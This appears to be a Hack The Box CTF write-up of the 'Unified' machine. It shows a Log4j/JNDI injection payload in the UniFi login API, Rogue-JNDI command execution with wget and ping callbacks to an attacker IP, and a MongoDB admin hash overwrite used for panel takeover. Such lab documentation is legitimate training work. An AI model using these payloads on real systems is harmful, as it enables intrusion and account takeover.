# Hack The Box - Unified Writeup

> **Status:** Completed  
> **Platform:** Hack The Box  
> **Category:** Web Exploitation, Log4j, MongoDB, Privilege Escalation  
> **Author:** Rully Rozaq  
> **Note:** This writeup is for an authorized CTF/lab environment only. Do not publish active-machine spoilers. Flags are intentionally censored.

---

## 1. Executive Summary

This report documents the exploitation process of the Hack The Box machine **Unified**. The target exposed a UniFi Network web application vulnerable to a Log4j/JNDI-based attack path. After confirming outbound JNDI callbacks from the target to the attacker machine, Rogue-JNDI was used to trigger command execution and obtain access to the system.

Post-exploitation focused on the UniFi application environment and its MongoDB database. The `ace` database contained administrative user records, including password hash fields. By updating the `x_shadow` hash for an administrative user, access to the UniFi web panel was obtained, which ultimately led to retrieval of `root.txt`.

The most important learning point in this machine was not only exploitation, but also troubleshooting: identifying why Burp Suite responses were hanging, validating JNDI callbacks with `tcpdump`, discovering firewall issues on Kali, and ensuring the LDAP/JNDI listener was correctly bound to the VPN interface.

---

## 2. Scope and Authorization

This activity was performed inside the Hack The Box lab environment.

| Item | Description |
|---|---|
| Platform | Hack The Box |
| Machine | Unified |
| Target IP | `10.129.96.149` |
| Attacker VPN IP | `10.10.15.66` |
| Environment | Authorized CTF / lab |
| Flags | Censored |

---

## 3. Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port and service discovery |
| Burp Suite Repeater | Manual HTTP request testing |
| `tcpdump` | Monitoring callback traffic from target |
| `ss` | Checking listening ports |
| `ufw` | Firewall troubleshooting |
| Rogue-JNDI | LDAP/JNDI payload delivery |
| `nc` | Testing TCP callback and reverse shell listener |
| MongoDB Shell | UniFi database interaction |

---

## 4. Reconnaissance

The initial phase started with service enumeration using Nmap.

```bash
nmap -sC -sV -oN nmap.txt 10.129.96.149
```

The important discovered service was the UniFi web application running over HTTPS, accessible on port `8443`.

```text
https://10.129.96.149:8443
```

The application showed the UniFi Network login interface.

---

## 5. Initial Web Testing

A login request was captured and sent to Burp Suite Repeater. The endpoint used during testing was:

```http
POST /api/login HTTP/1.1
Host: 10.129.96.149:8443
Content-Type: application/json; charset=utf-8
```

A normal test value confirmed that the API was reachable and responding:

```json
{
  "username": "admin",
  "password": "admin",
  "remember": "test",
  "strict": true
}
```

The server returned an application-level error response, which confirmed that the endpoint itself was working:

```json
{
  "meta": {
    "rc": "error",
    "msg": "api.err.InvalidPayload"
  },
  "data": []
}
```

---

## 6. Log4j / JNDI Callback Testing

The `remember` field was then tested with a JNDI payload pointing back to the attacker VPN IP:

```json
{
  "username": "admin",
  "password": "admin",
  "remember": "${jndi:ldap://10.10.15.66:1389/o=tomcat}",
  "strict": true
}
```

At first, Burp Suite appeared to hang and no response was returned. This was investigated using `tcpdump`.

```bash
sudo tcpdump -ni tun0 'host 10.129.96.149 and port 1389'
```

The target was seen attempting to connect to the attacker machine:

```text
10.129.96.149 > 10.10.15.66:1389 Flags [S]
```

This proved that the JNDI lookup was being triggered. However, the callback initially failed because the attacker machine was not properly accepting inbound connections on port `1389`.

---

## 7. Troubleshooting Callback Issues

### 7.1 Content-Length Issue

One issue during Burp testing was an incorrect `Content-Length` header. When the request body was modified manually, the old length remained and caused unstable request behavior.

The fix was to remove the manual `Content-Length` header and allow Burp Suite to recalculate it automatically.

Recommended request header:

```http
Connection: close
```

### 7.2 Firewall Issue

The callback was reaching Kali, but the connection was blocked/reset because the firewall was active.

The required ports were allowed on the VPN interface:

```bash
sudo ufw allow in on tun0 to any port 1389 proto tcp
sudo ufw allow in on tun0 to any port 8000 proto tcp
sudo ufw allow in on tun0 to any port 9000 proto tcp
```

### 7.3 Listener Verification

The port was checked using:

```bash
sudo ss -lntp | grep 1389
```

A simple listener was also used to confirm that the target could connect back:

```bash
sudo nc -lvnp 1389
```

Successful TCP callback example:

```text
connect to [10.10.15.66] from (UNKNOWN) [10.129.96.149]
```

This confirmed that the network path from the target to the attacker machine was working.

---

## 8. LDAP/JNDI Server Setup

Two approaches were tested:

1. `marshalsec` style LDAP reference with `Exploit.class`
2. Rogue-JNDI with the `o=tomcat` payload mapping

The first approach successfully produced an LDAP redirect but did not reliably result in the target downloading `Exploit.class` over HTTP.

The more suitable approach was Rogue-JNDI.

### 8.1 Build Rogue-JNDI

```bash
cd ~/Downloads
git clone https://github.com/veracode-research/rogue-jndi.git
cd rogue-jndi
mvn package -DskipTests
```

After a successful build, the JAR was available in the `target` directory:

```bash
ls target/
```

Example output:

```text
RogueJndi-1.1.jar
```

### 8.2 Run Rogue-JNDI

Rogue-JNDI was executed using the attacker's VPN IP:

```bash
cd ~/Downloads/rogue-jndi
java -jar target/RogueJndi-1.1.jar -c "ping -c 1 10.10.15.66" -n "10.10.15.66"
```

Rogue-JNDI started both HTTP and LDAP services:

```text
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.15.66:1389/o=tomcat to artsploit.controllers.Tomcat
```

When the payload was sent from Burp, Rogue-JNDI showed:

```text
Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
```

This confirmed that the vulnerable application was reaching the Rogue-JNDI server.

---

## 9. Exploitation Notes

The JNDI payload used in Burp Suite was:

```json
{
  "username": "admin",
  "password": "admin",
  "remember": "${jndi:ldap://10.10.15.66:1389/o=tomcat}",
  "strict": true
}
```

A common issue was that LDAP callbacks were successful, but command execution was not immediately visible. Several callback methods were tested, including:

```bash
ping -c 1 10.10.15.66
```

and HTTP callback tests such as:

```bash
wget -qO- http://10.10.15.66:9000/wgettest
```

A separate HTTP listener can be used to verify outbound command execution:

```bash
python3 -m http.server 9000 --bind 0.0.0.0
```

Expected success indicator:

```text
GET /wgettest HTTP/1.1
```

In this assessment, the key exploitation path eventually led to shell access on the target and access to the UniFi environment.

---

## 10. Post-Exploitation: UniFi and MongoDB

After obtaining access to the system, the UniFi MongoDB instance was identified. UniFi commonly uses a MongoDB database named `ace`.

MongoDB was accessed locally:

```bash
mongo --port 27117 ace
```

Administrative users were enumerated:

```js
db.admin.find().pretty()
```

The admin records included fields such as:

```json
{
  "email": "administrator@unified.htb",
  "name": "administrator",
  "x_shadow": "$6$...",
  "requires_new_password": false,
  "last_site_name": "default"
}
```

---

## 11. Password Hash Update

A new SHA-512 crypt-style hash was prepared and assigned to the `x_shadow` field of the selected admin user.

To avoid syntax issues inside the Mongo shell, variables were used:

```js
var id = ObjectId("61ce278f46e0fb0012d47ee4")
```

```js
var hash = '$6$REDACTED_HASH_VALUE'
```

Then the admin password hash was updated:

```js
db.admin.update({"_id": id}, {"$set": {"x_shadow": hash}})
```

Successful update example:

```js
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```

The updated record was verified with:

```js
db.admin.find({"_id": id}).pretty()
```

After the password hash was updated, login to the UniFi web panel was possible using the corresponding username and the password matching the new hash.

---

## 12. Root Access and Flag

After successful access and post-exploitation, `root.txt` was retrieved.

```text
root.txt: REDACTED
```

The flag is intentionally not included in this public writeup.

---

## 13. Problems Encountered and Fixes

| Problem | Cause | Fix |
|---|---|---|
| Burp Repeater hanging | Target was waiting on callback / malformed request length | Removed manual `Content-Length`, used `Connection: close` |
| Only SYN packets seen in tcpdump | Firewall blocked inbound callback | Allowed port `1389` on `tun0` |
| TCP reset from Kali | No service listening on port `1389` | Started LDAP/JNDI listener |
| LDAP worked but no HTTP `GET /Exploit.class` | Remote class loading approach not suitable | Switched to Rogue-JNDI `/o=tomcat` mapping |
| MongoDB update syntax errors | Incorrect `$set` object format / quote issues | Used variables for `id` and `hash` in Mongo shell |

---

## 14. Key Takeaways

- Always verify callbacks with packet capture tools such as `tcpdump`.
- A JNDI callback does not automatically mean command execution succeeded.
- Firewall rules on the attacker machine can silently break exploitation workflows.
- `ss -lntp` is useful for confirming whether a service is actually listening.
- Burp Suite request body edits can break `Content-Length` if not recalculated.
- MongoDB update syntax is easier and safer when using variables in the Mongo shell.
- Professional documentation should focus on methodology, evidence, and lessons learned, not just flags.

---

## 15. Remediation Recommendations

If this were a real-world assessment, the following mitigations would be recommended:

1. **Patch vulnerable Log4j components immediately.**
2. **Upgrade UniFi Network Application to a secure version.**
3. **Disable or restrict JNDI lookup behavior where possible.**
4. **Restrict outbound traffic from servers.** The target should not be able to freely reach arbitrary LDAP/HTTP endpoints.
5. **Segment internal services.** MongoDB should not be accessible unnecessarily.
6. **Protect local databases.** Enforce authentication and least-privilege access for MongoDB.
7. **Monitor suspicious outbound LDAP/RMI/DNS traffic.**
8. **Rotate credentials after compromise.**
9. **Review application logs for evidence of exploitation attempts.**

---

## 16. Cleanup

After testing, unnecessary listeners and open ports were cleaned up on the attacker machine:

```bash
sudo fuser -k 1389/tcp
sudo fuser -k 8000/tcp
sudo fuser -k 9000/tcp
sudo fuser -k 4444/tcp
```

UFW rules can be reviewed with:

```bash
sudo ufw status numbered
```

---

## 17. Disclaimer

This writeup is intended for educational purposes in an authorized lab environment. Do not use these techniques against systems without explicit permission. Flags and sensitive values have been redacted.
